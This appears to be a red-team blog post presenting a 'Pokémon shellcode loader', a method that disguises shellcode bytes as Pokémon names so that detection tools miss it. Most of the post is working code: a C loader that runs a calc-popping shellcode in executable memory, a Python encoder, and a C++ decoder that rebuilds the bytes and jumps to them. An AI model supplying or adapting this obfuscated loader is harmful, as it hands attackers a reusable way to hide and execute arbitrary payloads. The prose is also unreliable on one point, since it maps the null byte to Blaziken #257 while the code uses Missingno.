#  Pokémon Shellcode Loader
Tired of looking at hex all day and popping '\x41's? Rather look at Lugia/Charmander? I have the solution for you. A tweet came in from @Checkymander about creating a shellcode loader from Pokémon names. Great fun project to mess with the blue team, but there wasn't a POC! (or at least when I last checked)

> **Note #1**
> Updated Code will be on my GitHub: https://github.com/Techryptic/Pokemon-Shellcode-Loader

> **Note #2**
> GitBooks: https://techryptic.gitbook.io/pokemon-shellcode

> **Note #3**
> GitPages: https://techryptic.github.io/2022/07/28/Pokemon-Shellcode-Loader

# Let's Load Some Instructions
There are multiple ways to do this:
If we look at a shellcode, it's a series of hexes from 0x00-0xFF, or in decimal form of 0-256. There happens to be way more than 256 Pokemon that we can choose from.

![](https://680730519-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FycWm23nLowYCIfLQMLG7%2Fuploads%2FQ8rpeQ1rItyYbOvE2xVl%2Fimage.png?alt=media&token=19289e61-2b90-4579-9c7f-3f8528a8f55a)

From looking at the Pokemon chart above, we can translate BULBASAUR, who is #001, to 0x01 (dropping the first zero). Likewise, CHARMANDER will be represented by 0x04 and so on. The Lucky null byte 0x00 can be aligned to Pokemon #257, BLAZIKEN!

Converting shellcode to Pokemon-Shellcode is simple. How about converting Pokemon-Shellcode to Assembly?! Do we want to have an Array within the .ASM? C code? Pull it down externally?

Many directions to go down!

# To Array or not to Array
We need data. First, I found two areas that contain both the number of the Pokemon and their name:

> https://gist.github.com/armgilles/194bcff35001e7eb53a2a8b441e8b2c6

And another one that only has the name of the Pokemon. This might be more useful because we can get the array index position for a particular pokemon without carrying over a long string.

> https://github.com/sindresorhus/pokemon/blob/main/data/en.json

# What's the baseline?
I am taking a regular POP CALC shellcode and throwing some C's at it.

```c++
#include <windows.h>

void main() {
    void* exec;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;
    // Shellcode
    unsigned char payload[] =
		"\x50\x53\x51\x52\x56\x57\x55\x89"
		"\xe5\x83\xec\x18\x31\xf6\x56\x6a"
		"\x63\x66\x68\x78\x65\x68\x57\x69"
		"\x6e\x45\x89\x65\xfc\x31\xf6\x64"
		"\x8b\x5e\x30\x8b\x5b\x0c\x8b\x5b"
		"\x14\x8b\x1b\x8b\x1b\x8b\x5b\x10"
		"\x89\x5d\xf8\x31\xc0\x8b\x43\x3c"
		"\x01\xd8\x8b\x40\x78\x01\xd8\x8b"
		"\x48\x24\x01\xd9\x89\x4d\xf4\x8b"
		"\x78\x20\x01\xdf\x89\x7d\xf0\x8b"
		"\x50\x1c\x01\xda\x89\x55\xec\x8b"
		"\x58\x14\x31\xc0\x8b\x55\xf8\x8b"
		"\x7d\xf0\x8b\x75\xfc\x31\xc9\xfc"
		"\x8b\x3c\x87\x01\xd7\x66\x83\xc1"
		"\x08\xf3\xa6\x74\x0a\x40\x39\xd8"
		"\x72\xe5\x83\xc4\x26\xeb\x41\x8b"
		"\x4d\xf4\x89\xd3\x8b\x55\xec\x66"
		"\x8b\x04\x41\x8b\x04\x82\x01\xd8"
		"\x31\xd2\x52\x68\x2e\x65\x78\x65"
		"\x68\x63\x61\x6c\x63\x68\x6d\x33"
		"\x32\x5c\x68\x79\x73\x74\x65\x68"
		"\x77\x73\x5c\x53\x68\x69\x6e\x64"
		"\x6f\x68\x43\x3a\x5c\x57\x89\xe6"
		"\x6a\x0a\x56\xff\xd0\x83\xc4\x46"
		"\x5d\x5f\x5e\x5a\x59\x5b\x58\xc3";
    unsigned int payload_len = 205;
    exec = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    RtlMoveMemory(exec, payload, payload_len);
    rv = VirtualProtect(exec, payload_len, PAGE_EXECUTE_READ, &oldprotect);
    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);
    WaitForSingleObject(th, -1);
}
```
![](https://680730519-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FhjtCVankMBzHfXUecU9j%2Fuploads%2F7VJrtoOJZB0JKISN4fV6%2Fimage.png?alt=media&token=de3e596d-0721-4e73-aa6c-7f38addad6cb)

Not bad. It's not doing anything malicious, but still... not bad.

# Shellcode -> Pokemon_Shellcode
A simple script converts a shellcode byte Object into the Pokémon Shellcode.

```python
import json

shellcode = (b"\x41\x42\x20\x43")

#Do not edit below
PokemonList = ["Missingno","Bulbasaur","Ivysaur","Venusaur","Charmander","Charmeleon","Charizard","Squirtle","Wartortle","Blastoise","Caterpie","Metapod","Butterfree","Weedle","Kakuna","Beedrill","Pidgey","Pidgeotto","Pidgeot","Rattata","Raticate","Spearow","Fearow","Ekans","Arbok","Pikachu","Raichu","Sandshrew","Sandslash","NidoranF","Nidorina","Nidoqueen","NidoranM","Nidorino","Nidoking","Clefairy","Clefable","Vulpix","Ninetales","Jigglypuff","Wigglytuff","Zubat","Golbat","Oddish","Gloom","Vileplume","Paras","Parasect","Venonat","Venomoth","Diglett","Dugtrio","Meowth","Persian","Psyduck","Golduck","Mankey","Primeape","Growlithe","Arcanine","Poliwag","Poliwhirl","Poliwrath","Abra","Kadabra","Alakazam","Machop","Machoke","Machamp","Bellsprout","Weepinbell","Victreebel","Tentacool","Tentacruel","Geodude","Graveler","Golem","Ponyta","Rapidash","Slowpoke","Slowbro","Magnemite","Magneton","Farfetchd","Doduo","Dodrio","Seel","Dewgong","Grimer","Muk","Shellder","Cloyster","Gastly","Haunter","Gengar","Onix","Drowzee","Hypno","Krabby","Kingler","Voltorb","Electrode","Exeggcute","Exeggutor","Cubone","Marowak","Hitmonlee","Hitmonchan","Lickitung","Koffing","Weezing","Rhyhorn","Rhydon","Chansey","Tangela","Kangaskhan","Horsea","Seadra","Goldeen","Seaking","Staryu","Starmie","Mr. Mime","Scyther","Jynx","Electabuzz","Magmar","Pinsir","Tauros","Magikarp","Gyarados","Lapras","Ditto","Eevee","Vaporeon","Jolteon","Flareon","Porygon","Omanyte","Omastar","Kabuto","Kabutops","Aerodactyl","Snorlax","Articuno","Zapdos","Moltres","Dratini","Dragonair","Dragonite","Mewtwo","Mew","Chikorita","Bayleef","Meganium","Cyndaquil","Quilava","Typhlosion","Totodile","Croconaw","Feraligatr","Sentret","Furret","Hoothoot","Noctowl","Ledyba","Ledian","Spinarak","Ariados","Crobat","Chinchou","Lanturn","Pichu","Cleffa","Igglybuff","Togepi","Togetic","Natu","Xatu","Mareep","Flaaffy","Ampharos","Bellossom","Marill","Azumarill","Sudowoodo","Politoed","Hoppip","Skiploom","Jumpluff","Aipom","Sunkern","Sunflora","Yanma","Wooper","Quagsire","Espeon","Umbreon","Murkrow","Slowking","Misdreavus","Unown","Wobbuffet","Girafarig","Pineco","Forretress","Dunsparce","Gligar","Steelix","Snubbull","Granbull","Qwilfish","Scizor","Shuckle","Heracross","Sneasel","Teddiursa","Ursaring","Slugma","Magcargo","Swinub","Piloswine","Corsola","Remoraid","Octillery","Delibird","Mantine","Skarmory","Houndour","Houndoom","Kingdra","Phanpy","Donphan","Porygon2","Stantler","Smeargle","Tyrogue","Hitmontop","Smoochum","Elekid","Magby","Miltank","Blissey","Raikou","Entei","Suicune","Larvitar","Pupitar","Tyranitar","Lugia","Ho-Oh","Celebi","Treecko","Grovyle","Sceptile","Torchic"]
Poke_Shellcode = []
for x in shellcode:
	Poke_Shellcode.append(PokemonList[x])
print(json.dumps(Poke_Shellcode))
```

Taking the shellcode above: 
> \x00\x31\xc0\x50\x68\x2f\x2F

Converts to:

![](https://680730519-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FhjtCVankMBzHfXUecU9j%2Fuploads%2FbfaVgZFEnrdZ9LlMWSi7%2Fimage.png?alt=media&token=00d709f0-0c35-42b5-a184-4a4a9d0fbdfe)

Fun Fact: I wanted to keep the Pokemon name aligned with their number (BULBASAUR = #1, or 0x01), thus needed to fill 0x00/null byte with something. What's better fitting than MISSINGNO?!

![](https://680730519-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FhjtCVankMBzHfXUecU9j%2Fuploads%2Frdaobk6ZBOsTau3GzYoT%2Fimage.png?alt=media&token=b92673a4-ee5f-4960-a4c5-997e8199df0f)

Another issue is that the Pokemon Farfetch'd have an apostrophe, as shown below. The easy fix is just to remove it and call it: Farfetchd

![](https://680730519-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FhjtCVankMBzHfXUecU9j%2Fuploads%2FxFy1aqTlmNiVl30xE5UD%2Fimage.png?alt=media&token=6fbf2ab2-69bb-4d63-a2eb-df72811afb6e)

Finally, there are also two Pokémon that share the same name once you remove the symbols, the fix for those two was to append an F (for female), and for the other append an M (for male).

![](https://680730519-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FhjtCVankMBzHfXUecU9j%2Fuploads%2F1GeOSYbCd5DVN0oBMOiR%2Fimage.png?alt=media&token=6d595439-07e7-446b-980e-9331f426bc35)

![](https://680730519-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FhjtCVankMBzHfXUecU9j%2Fuploads%2FbA89s5rMV80igl7bq1Kf%2Fimage.png?alt=media&token=0a7fe208-d05f-4604-87a3-1b906658f869)

# C++ Function
```c++
#include <iostream>
#include <string>
#include <Bits.h>
using namespace std;

// Created by: Techryptic
// @Tech

string indexNumberToHexa(int number);
void reverse_String(string& str, int last_index, int starting_index);
void printAscii(unsigned char* index_to_hexa_array, int counter_s);

int main()
{
    string poke_shellcode[] = { "Slowbro", "Farfetchd", "Magnemite", "Magneton", "Seel", "Dewgong", "Dodrio", "Porygon", "Houndoom", "Lapras", "Tyrogue", "Arbok", "Venomoth", "Larvitar", "Seel", "Hitmonlee", "Kingler", "Exeggcute", "Cubone", "Staryu", "Electrode", "Cubone", "Dewgong", "Marowak", "Weezing", "Bellsprout", "Porygon", "Electrode", "Treecko", "Venomoth", "Larvitar", "Voltorb", "Omastar", "Gengar", "Venonat", "Omastar", "Cloyster", "Butterfree", "Omastar", "Cloyster", "Raticate", "Omastar", "Sandshrew", "Omastar", "Sandshrew", "Omastar", "Cloyster", "Pidgey", "Porygon", "Haunter", "Tyranitar", "Venomoth", "Sunflora", "Omastar", "Machoke", "Poliwag", "Bulbasaur", "Teddiursa", "Omastar", "Kadabra", "Staryu", "Bulbasaur", "Teddiursa", "Omastar", "Tentacool", "Clefable", "Bulbasaur", "Ursaring", "Porygon", "Ponyta", "Entei", "Omastar", "Staryu", "NidoranM", "Bulbasaur", "Remoraid", "Porygon", "Electabuzz", "Magby", "Omastar", "Slowbro", "Sandslash", "Bulbasaur", "Slugma", "Porygon", "Dodrio", "Tyrogue", "Omastar", "Grimer", "Raticate", "Venomoth", "Sunflora", "Omastar", "Dodrio", "Tyranitar", "Omastar", "Electabuzz", "Magby", "Omastar", "Seadra", "Treecko", "Venomoth", "Unown", "Treecko", "Omastar", "Poliwag", "Jolteon", "Bulbasaur", "Sneasel", "Exeggcute", "Lapras", "Yanma", "Wartortle", "Raikou", "Ledian", "Horsea", "Caterpie", "Kadabra", "Primeape", "Teddiursa", "Tangela", "Houndoom", "Lapras", "Espeon", "Ninetales", "Smeargle", "Alakazam", "Omastar", "Ponyta", "Entei", "Porygon", "Qwilfish", "Omastar", "Dodrio", "Tyrogue", "Exeggcute", "Omastar", "Charmander", "Alakazam", "Omastar", "Charmander", "Gyarados", "Bulbasaur", "Teddiursa", "Venomoth", "Granbull", "Magneton", "Cubone", "Paras", "Electrode", "Staryu", "Electrode", "Cubone", "Kingler", "Hypno", "Lickitung", "Kingler", "Cubone", "Koffing", "Dugtrio", "Diglett", "Gastly", "Cubone", "Starmie", "Kangaskhan", "Horsea", "Electrode", "Cubone", "Seaking", "Kangaskhan", "Gastly", "Farfetchd", "Cubone", "Marowak", "Weezing", "Voltorb", "Rhyhorn", "Cubone", "Machoke", "Growlithe", "Gastly", "Dewgong", "Porygon", "Kingdra", "Hitmonlee", "Caterpie", "Seel", "Torchic", "Steelix", "Lapras", "Espeon", "Weepinbell", "Haunter", "Onix", "Gengar", "Shellder", "Muk", "Cloyster", "Grimer", "Quagsire" };

    /// Do not edit below
    string pokemon[256] = { "Missingno", "Bulbasaur", "Ivysaur", "Venusaur", "Charmander", "Charmeleon", "Charizard", "Squirtle", "Wartortle", "Blastoise", "Caterpie", "Metapod", "Butterfree", "Weedle", "Kakuna", "Beedrill", "Pidgey", "Pidgeotto", "Pidgeot", "Rattata", "Raticate", "Spearow", "Fearow", "Ekans", "Arbok", "Pikachu", "Raichu", "Sandshrew", "Sandslash", "NidoranF", "Nidorina", "Nidoqueen", "NidoranM", "Nidorino", "Nidoking", "Clefairy", "Clefable", "Vulpix", "Ninetales", "Jigglypuff", "Wigglytuff", "Zubat", "Golbat", "Oddish", "Gloom", "Vileplume", "Paras", "Parasect", "Venonat", "Venomoth", "Diglett", "Dugtrio", "Meowth", "Persian", "Psyduck", "Golduck", "Mankey", "Primeape", "Growlithe", "Arcanine", "Poliwag", "Poliwhirl", "Poliwrath", "Abra", "Kadabra", "Alakazam", "Machop", "Machoke", "Machamp", "Bellsprout", "Weepinbell", "Victreebel", "Tentacool", "Tentacruel", "Geodude", "Graveler", "Golem", "Ponyta", "Rapidash", "Slowpoke", "Slowbro", "Magnemite", "Magneton", "Farfetchd", "Doduo", "Dodrio", "Seel", "Dewgong", "Grimer", "Muk", "Shellder", "Cloyster", "Gastly", "Haunter", "Gengar", "Onix", "Drowzee", "Hypno", "Krabby", "Kingler", "Voltorb", "Electrode", "Exeggcute", "Exeggutor", "Cubone", "Marowak", "Hitmonlee", "Hitmonchan", "Lickitung", "Koffing", "Weezing", "Rhyhorn", "Rhydon", "Chansey", "Tangela", "Kangaskhan", "Horsea", "Seadra", "Goldeen", "Seaking", "Staryu", "Starmie", "Mr. Mime", "Scyther", "Jynx", "Electabuzz", "Magmar", "Pinsir", "Tauros", "Magikarp", "Gyarados", "Lapras", "Ditto", "Eevee", "Vaporeon", "Jolteon", "Flareon", "Porygon", "Omanyte", "Omastar", "Kabuto", "Kabutops", "Aerodactyl", "Snorlax", "Articuno", "Zapdos", "Moltres", "Dratini", "Dragonair", "Dragonite", "Mewtwo", "Mew", "Chikorita", "Bayleef", "Meganium", "Cyndaquil", "Quilava", "Typhlosion", "Totodile", "Croconaw", "Feraligatr", "Sentret", "Furret", "Hoothoot", "Noctowl", "Ledyba", "Ledian", "Spinarak", "Ariados", "Crobat", "Chinchou", "Lanturn", "Pichu", "Cleffa", "Igglybuff", "Togepi", "Togetic", "Natu", "Xatu", "Mareep", "Flaaffy", "Ampharos", "Bellossom", "Marill", "Azumarill", "Sudowoodo", "Politoed", "Hoppip", "Skiploom", "Jumpluff", "Aipom", "Sunkern", "Sunflora", "Yanma", "Wooper", "Quagsire", "Espeon", "Umbreon", "Murkrow", "Slowking", "Misdreavus", "Unown", "Wobbuffet", "Girafarig", "Pineco", "Forretress", "Dunsparce", "Gligar", "Steelix", "Snubbull", "Granbull", "Qwilfish", "Scizor", "Shuckle", "Heracross", "Sneasel", "Teddiursa", "Ursaring", "Slugma", "Magcargo", "Swinub", "Piloswine", "Corsola", "Remoraid", "Octillery", "Delibird", "Mantine", "Skarmory", "Houndour", "Houndoom", "Kingdra", "Phanpy", "Donphan", "Porygon2", "Stantler", "Smeargle", "Tyrogue", "Hitmontop", "Smoochum", "Elekid", "Magby", "Miltank", "Blissey", "Raikou", "Entei", "Suicune", "Larvitar", "Pupitar", "Tyranitar", "Lugia", "Ho-Oh", "Celebi", "Treecko", "Grovyle", "Sceptile", "Torchic" };

    int size1 = sizeof(pokemon) / sizeof(pokemon[0]);
    int size2 = sizeof(poke_shellcode) / sizeof(poke_shellcode[0]);
    //creating a dynamic array for holding indexes having size=siez of poke_shellcode considering the
    //assumtion that all poke_shellcode elements exist in pokemon
    int* index = new int[size2];
    int index_counter = 0;
    for (int i = 0; i < size2; i++) {                           //reading poke_shellcode element one by one
        for (int j = 0; j < size1; j++) {                       //reading pokemon element one by one
            if (poke_shellcode[i].compare(pokemon[j]) == 0) {   //both strings are equal
                index[index_counter] = j;                       //saving index
                index_counter++;
                break;                                          //stoping inner loop
            }
        }
    }
    //for storing hex values of indexes
    unsigned char* index_to_hexa_array = new unsigned char[index_counter * 5];
    int counter_s = 0;
    for (int i = 0; i < index_counter; i++) {
        string value = "";
        value += "\\x";
        if (index[i] < 10) {
            value += "0";
        }
        value += indexNumberToHexa(index[i]);  //converting each index to hexa and inserting in array
        for (int k = 0; k < (int)value.length(); k++) {
            index_to_hexa_array[counter_s] = value[k];
            counter_s++;
        }
    }
    std::string payload;
    index_to_hexa_array[counter_s] = '\0';
    printAscii(index_to_hexa_array, counter_s);

    delete[]index; //freeing memory
    delete[]index_to_hexa_array;
    index = nullptr;  //reseting the index pointer
    index_to_hexa_array = nullptr;
    return 0;
}

void reverse_String(string& str, int last_index, int starting_index) {
    if (last_index <= starting_index) { return; }
    swap(str[starting_index], str[last_index]);
    reverse_String(str, last_index - 1, starting_index + 1);
}
string indexNumberToHexa(int number) {
    string hexavalue = "";
    while (number != 0) {
        int remainder = number % 16;
        if (remainder < 10) {   //number 0-9
            hexavalue += remainder + 48;
        }
        else {//alphabet A-F
            hexavalue += remainder + 55; //converting number to alphabet
        }
        number = number / 16;
    }
    reverse_String(hexavalue, hexavalue.length() - 1, 0);
    return (hexavalue != "" ? hexavalue : "0");
}
void printAscii(unsigned char* index_to_hexa_array, int counter_s) {
    string sc;
    for (int i = 2; i < counter_s; i++) {
        if (index_to_hexa_array[i] != '\\' && index_to_hexa_array[i] != 'x') {//hex value cannot be more than 2 characters
            string vt; // hex ex: 01
            vt.push_back(index_to_hexa_array[i]);
            vt.push_back(index_to_hexa_array[i + 1]);
            //cout << (char)stoul(vt, nullptr, 16);
            unsigned char n = (char)stoul(vt, nullptr, 16);
            sc += n;
            i++;
        }
    }
    sc += '\0'; // adding nullbyte to string to mimic array
    //std::cout << "The size is " << sc.size() << " bytes.\n";
    DWORD oldprotect = 0;
    void* exec = VirtualAlloc(0, sc.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, sc.c_str(), sc.size());
    ((void(*)())exec)();
}
```
# Conclusion

![](https://680730519-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FhjtCVankMBzHfXUecU9j%2Fuploads%2FY6HSZxk4xB0ubnUFsLUM%2Fimage.png?alt=media&token=63744964-a5f0-480b-9af9-1d2d7f9195cd)

That, that's the conclusion. 
Same code but using pokemon yields a way better result than I thought it would.

In the end, it's still a battle between Red vs. Blue

![](https://techryptic.github.io/img/post-pokemon-conclusion.gif)
